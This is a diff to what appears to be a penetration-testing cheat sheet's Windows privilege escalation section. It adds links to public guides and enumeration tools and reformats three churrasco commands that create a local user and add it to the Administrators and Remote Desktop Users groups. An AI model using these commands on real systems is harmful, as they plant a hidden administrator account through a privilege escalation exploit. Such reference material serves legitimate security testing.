@@ -105,13 +105,17 @@ Priv Esc - Linux
 Priv Esc - Windows
 ----------------
  - http://www.fuzzysecurity.com/tutorials/16.html
- - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+ - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+ - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc (PowerUp)
  - https://github.com/M4ximuss/Powerless
  - https://github.com/sagishahar/lpeworkshop
  - https://github.com/411Hall/JAWS
- - c:\Inetpub>churrasco -d "net user /add <username> <password>"
- - c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
- - c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
+ - https://github.com/rasta-mouse/Watson
+ - https://github.com/rasta-mouse/Sherlock (Deprecated)
+ - https://github.com/GDSSecurity/Windows-Exploit-Suggester
+ - churrasco -d "net user /add <username> <password>"
+ - churrasco -d "net localgroup administrators <username> /add"
+ - churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
 
 Post Exploitation
 ----------------
